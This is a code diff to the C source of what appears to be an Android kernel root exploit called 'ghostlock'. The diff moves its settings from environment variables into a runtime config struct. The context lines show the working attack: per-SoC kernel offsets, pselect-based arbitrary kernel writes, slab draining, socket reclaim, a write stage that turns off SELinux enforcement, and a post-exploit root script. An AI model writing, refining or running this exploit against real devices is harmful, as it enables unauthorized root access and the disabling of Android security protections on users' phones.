@@ -20,9 +20,11 @@
 
 const struct kernel_offsets *active_offsets = NULL;
 
-static char g_home_dir[256] = "/data/local/tmp";
-static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
-static char g_ksu_log_path[320] = "/data/local/tmp/.ghostlock_ksu.log";
+// TODO(decoupling:S14-session): Future: pass RuntimeConfig via ExploitSession.
+// Input: const session config; output: paths without process-global aliases.
+// Blocked by: victim/handoff orchestration is centralized in main until S14.
+#define g_home_dir (g_runtime_config.home_dir)
+#define g_root_script_path (g_runtime_config.root_script_path)
 
 /* MTK / XRing / Tensor use different physical mappings from the Qualcomm default. */
 enum soc_family {
@@ -281,9 +283,7 @@ static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
 /* Decoupling plan: read top-level elapsed time. Input: timeline reference;
  * output: milliseconds. Future: exploit_timeline_elapsed(const timeline *). */
 static double timer_ms(void) {
-  struct timespec now;
-  clock_gettime(CLOCK_MONOTONIC, &now);
-  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
+  return runtime_elapsed_ms(&t0);
 }
 #define TIMER(label) do { \
     pr_info("[T+%.0fms] %s\n", timer_ms(), label); \
@@ -500,7 +500,8 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
    * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
   pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, mode);
-  if (kernel5_route_selected() && getenv("GHOSTLOCK_5X_RESIDENT")) {
+  if (kernel5_route_selected() &&
+      g_runtime_config.multicast_resident_enabled) {
     if (!kernel5_resident_start()) {
       pr_warning("5.x resident multicast setup failed\n");
       clear_pselect_write();
@@ -602,81 +603,6 @@ static void slab_drain(void) {
     sched_yield();
     usleep(20000);
   }
-}
-
-int g_core_main = 0;
-int g_core_consumer = 1;
-
-/* Decoupling plan: choose main and consumer CPUs. Input: environment/sysfs;
- * output: RuntimeConfig. Future: runtime_config_init_cpu(), called once. */
-void init_cpu_config(void) {
-  g_core_main = 0;
-  g_core_consumer = 1;
-
-  const char *s = getenv("GHOSTLOCK_CORE");
-  if (s && *s) {
-    long v = strtol(s, NULL, 10);
-    if (v >= 0 && v < CPU_SETSIZE) {
-      g_core_main = (int)v;
-    } else {
-      pr_warning("invalid GHOSTLOCK_CORE=%s, using %d\n", s, g_core_main);
-    }
-  }
-  s = getenv("GHOSTLOCK_CONSUMER_CORE");
-  if (s && *s) {
-    long v = strtol(s, NULL, 10);
-    if (v >= 0 && v < CPU_SETSIZE) {
-      g_core_consumer = (int)v;
-    } else {
-      pr_warning("invalid GHOSTLOCK_CONSUMER_CORE=%s, using %d\n", s,
-                 g_core_consumer);
-    }
-  } else {
-    g_core_consumer = g_core_main + 1;
-  }
-
-  if (g_core_main == g_core_consumer) {
-    pr_warning("main and consumer cores are the same (%d); falling back\n",
-               g_core_main);
-    g_core_main = 0;
-    g_core_consumer = 1;
-  }
-
-  cpu_set_t allowed;
-  if (sched_getaffinity(0, sizeof(allowed), &allowed) == 0 &&
-      (!CPU_ISSET(g_core_main, &allowed) ||
-       !CPU_ISSET(g_core_consumer, &allowed))) {
-    pr_warning("cores %d/%d not in allowed cpuset; falling back to 0/1\n",
-               g_core_main, g_core_consumer);
-    g_core_main = 0;
-    g_core_consumer = 1;
-  }
-
-  pr_info("cpu pair: main=%d consumer=%d\n", g_core_main, g_core_consumer);
-}
-
-/* Decoupling plan: capture working and root-script paths. Input: environment;
- * output: RuntimeConfig path fields. Future: runtime_config_init_paths(). */
-static void init_runtime_paths(void) {
-  const char *home = getenv("GHOSTLOCK_HOME");
-  if (!home || !home[0]) home = getenv("TMPDIR");
-  if (!home || !home[0]) home = "/data/local/tmp";
-
-  snprintf(g_home_dir, sizeof(g_home_dir), "%s", home);
-  size_t n = strlen(g_home_dir);
-  while (n > 1 && g_home_dir[n - 1] == '/') {
-    g_home_dir[--n] = '\0';
-  }
-  snprintf(g_root_script_path, sizeof(g_root_script_path),
-           "%s/.ghostlock_root.sh", g_home_dir);
-  const char *ksu_log = getenv("GHOSTLOCK_KSU_LOG");
-  if (ksu_log && ksu_log[0]) {
-    snprintf(g_ksu_log_path, sizeof(g_ksu_log_path), "%s", ksu_log);
-  } else {
-    snprintf(g_ksu_log_path, sizeof(g_ksu_log_path),
-             "%s/.ghostlock_ksu.log", g_home_dir);
-  }
-  pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
 }
 
 /* Decoupling plan: materialize the post-exploit handoff script. Input: const
@@ -1271,8 +1197,11 @@ int run_exploit(int argc, char **argv) {
   signal(SIGPIPE, SIG_IGN);
   set_limit();
   reserve_standard_io();
-  init_cpu_config();
-  init_runtime_paths();
+  if (runtime_config_init(&g_runtime_config) != 0) {
+    pr_error("runtime configuration failed errno=%d\n", errno);
+    return 1;
+  }
+  runtime_config_log(&g_runtime_config);
   write_root_script();
 
   if (!active_offsets && select_offsets() < 0) return 1;
@@ -1286,7 +1215,7 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
-  if (getenv("GHOSTLOCK_5X_PHASE1_PROBE")) {
+  if (g_runtime_config.multicast_phase1_probe) {
     if (!kernel5_route_selected()) {
       pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
       return 1;
@@ -1307,7 +1236,7 @@ int run_exploit(int argc, char **argv) {
     }
     TIMER("pre-W1 drain");
     int w1_attempts = (kernel5_route_selected() &&
-                       !getenv("GHOSTLOCK_5X_RESIDENT")) ? 1 : 15;
+                       !g_runtime_config.multicast_resident_enabled) ? 1 : 15;
     selinux_ok = retry_write_stage(
         "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, w1_attempts, 100000,
         verify_selinux_stage, NULL, 0);
@@ -1316,7 +1245,8 @@ int run_exploit(int argc, char **argv) {
       kernel5_resident_stop();
       return 1;
     }
-    if (kernel5_route_selected() && !getenv("GHOSTLOCK_5X_RESIDENT")) {
+    if (kernel5_route_selected() &&
+        !g_runtime_config.multicast_resident_enabled) {
       uintptr_t w1_scratch_poison =
           page_base + active_offsets->mcast_buffer_size;
       if (!quarantine_reclaim_sockets()) {
@@ -1341,7 +1271,8 @@ int run_exploit(int argc, char **argv) {
         return 1;
       }
     }
-    if (kernel5_route_selected() && getenv("GHOSTLOCK_5X_RESIDENT")) {
+    if (kernel5_route_selected() &&
+        g_runtime_config.multicast_resident_enabled) {
       uintptr_t repair =
           (data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss) +
            active_offsets->mcast_fake_lock_offset)
@@ -1353,7 +1284,7 @@ int run_exploit(int argc, char **argv) {
       }
     }
     TIMER("Write 1 complete");
-    if (getenv("GHOSTLOCK_W1_ONLY")) {
+    if (g_runtime_config.w1_only) {
       pr_success("W1-only diagnostic complete\n");
       return 0;
     }
